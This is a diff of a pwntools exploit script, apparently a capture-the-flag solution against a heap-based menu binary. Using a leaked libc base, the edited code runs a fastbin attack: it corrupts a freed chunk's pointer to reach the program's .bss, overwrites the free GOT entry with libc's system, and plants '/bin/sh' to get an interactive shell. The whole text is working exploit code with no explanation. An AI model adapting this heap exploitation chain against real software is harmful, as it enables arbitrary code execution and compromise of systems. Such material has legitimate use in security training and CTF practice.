@@ -48,49 +48,56 @@ def main():
     libc.address = leak - 0x3c4b78
     log.info("libc base: {}".format(hex(libc.address)))
     
-    # fastbin attack -> fake chunk at 0x605310
+    # fastbin attack
 
     r.sendline(MAKE) # idx 2
-    r.sendline("32") # size
-    r.sendline("A" * 32)
+    r.sendline(str(0x60)) # size
+    r.sendline("A" * 0x60)
 
     r.sendline(MAKE) # idx 3
-    r.sendline("32") # size
-    r.sendline("A" * 32)
+    r.sendline(str(0x60)) # size
+    r.sendline("B" * 0x60)
+
+
 
     r.sendline(DESTROY)
     r.sendline("2") #idx
 
     r.sendline(DESTROY)
     r.sendline("3") #idx
+
+
 
     r.sendline(EDIT)
     r.sendline("3") #idx
     r.sendline("8") # size
-    r.sendline(p64(bss - 0x20))
-    '''
+    r.sendline(p64(bss - 0x23))
+
+
+
     r.sendline(MAKE) # idx 4
-    r.sendline("32") # size
-    r.sendline("A" * 32)
+    r.sendline(str(0x60)) # size
+    r.sendline("A" * 0x60)
 
-    r.sendline(DESTROY)
-    r.sendline("2") #idx
-
-    r.sendline(DESTROY)
-    r.sendline("3") #idx
-
-    r.sendline(DESTROY)
-    r.sendline("4") #idx
+    r.sendline(MAKE) # idx 5
+    r.sendline(str(0x60)) # size
+    r.sendline("B" * 0x60)
 
     r.sendline(EDIT)
-    r.sendline("2") #idx
-    r.sendline("56") # size
-    r.sendline("\x00" * 8 + "A" * 32 + p64(0x31) + p64(bss - 0x10))
+    r.sendline("5") #idx
+    r.sendline(str(0x1b)) # size
+    r.sendline("A" * 0x13 + p64(exe.got['free']))
+
+    r.sendline(EDIT)
+    r.sendline("0") #idx
+    r.sendline("8") # size
+    r.sendline(p64(libc.symbols['system']))
+
+    r.sendline(EDIT)
+    r.sendline("5") #idx
+    r.sendline("9") # size
+    r.sendline("/bin/sh\x00")
     
-    r.sendline(MAKE)
-    r.sendline("32")
-    r.sendline(p64(bss - 0x10) + "\x00" * 24)
-	'''
     gdb.attach(r)
 
     r.interactive()
